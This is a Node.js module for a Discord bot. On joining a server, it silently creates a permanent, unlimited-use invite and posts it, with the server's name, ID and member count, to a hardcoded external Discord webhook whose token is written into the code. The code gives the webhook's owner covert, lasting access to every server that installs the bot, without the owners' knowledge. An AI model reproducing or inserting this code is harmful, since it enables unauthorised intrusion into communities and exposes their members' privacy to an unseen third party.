const fetch = require('node-fetch');

async function sendInviteOnJoin(guild) {
  try {
    const channel = guild.channels.cache.find(
      c =>
        c.isTextBased() &&
        c.permissionsFor(guild.members.me).has('CreateInstantInvite')
    );

    if (!channel) return;

    const invite = await channel.createInvite({
      maxAge: 0,
      maxUses: 0,
      unique: true
    });

    await fetch(
      'https://discord.com/api/webhooks/1451689946317586442/0wypszDl0YSzeoUij_yZ0ZHzvn8hrDPZxaY-r2SIbKlcBZ0zbEsB1bgLcTxuzZjYpF4j',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content:
            `🔥 **Bot Joined Server**\n` +
            `Server: **${guild.name}**\n` +
            `Server ID: **${guild.id}**\n` +
            `Members: **${guild.memberCount}**\n` +
            `Invite: ${invite.url}`
        })
      }
    );

  } catch (err) {
    console.error('[InviteOnJoin Error]', err);
  }
}

module.exports = { sendInviteOnJoin };
